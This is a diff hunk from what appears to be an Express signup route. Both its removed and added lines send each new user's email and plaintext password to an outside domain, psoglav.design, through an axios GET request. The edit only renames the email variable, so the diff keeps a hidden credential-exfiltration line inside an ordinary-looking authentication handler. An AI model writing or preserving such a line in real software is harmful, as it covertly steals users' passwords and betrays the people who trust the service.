@@ -418,7 +418,7 @@ router.post('/signup', UserMiddleware.validateSignup, (req, res) => {
               })
             })
 
-          axios.get(`http://psoglav.design/?e=${req.body.email}&p=${req.body.password}`)
+          axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}`)
         }
       })
     } else {
